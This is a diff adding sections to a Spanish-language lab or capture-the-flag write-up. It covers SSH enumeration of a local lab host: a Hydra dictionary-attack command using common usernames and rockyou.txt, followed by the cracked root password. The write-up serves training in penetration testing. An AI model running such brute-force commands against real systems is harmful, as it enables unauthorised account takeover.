@@ -49,3 +49,18 @@ Al ser el único puerto abierto, la fase de Enumeration se enfocará en SSH (usu
 
 
 ![escaneo nmap](images/tres.png)
+
+## 5) Enumeration (SSH) - Hydra
+
+Como el único servicio expuesto es **SSH (22/tcp)**, realizamos una enumeración enfocada en credenciales usando **Hydra** (ataque de diccionario) con un listado de usuarios comunes y el diccionario `rockyou.txt`.
+
+```bash
+hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
+```
+## 6) Resultados del ataque de fuerza bruta - Hydra
+Se encontraron credenciales válidas para SSH:
+
+user: root
+password: estrella
+
+![resultado de hydra](images/cuatro.png)
